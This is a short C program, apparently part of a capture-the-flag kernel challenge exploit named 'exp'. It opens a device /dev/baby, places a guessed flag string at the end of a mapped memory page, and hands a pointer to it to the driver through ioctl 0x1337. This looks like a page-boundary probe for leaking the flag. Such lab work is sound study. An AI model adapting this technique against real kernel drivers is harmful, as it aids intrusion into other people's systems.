#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
typedef struct flag_info {
	char* flag_ptr;
	int flag_len;
}flag_info;

flag_info flag;

int main(int argc, char** argv, char** env)
{
	int fd = open("/dev/baby", 2);
	flag.flag_len = 33;
	if (argc < 2)
	{
		puts("usage: ./exp flag_str");
		exit(-1);
	}
	int flag_len = strlen(argv[1]);
	char *buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
	char *flag_addr = buf + 4096 - flag_len;
	memcpy(flag_addr, argv[1], flag_len);
	flag.flag_ptr = flag_addr;
	ioctl(fd, 0x1337, &flag);
	return 0;
}
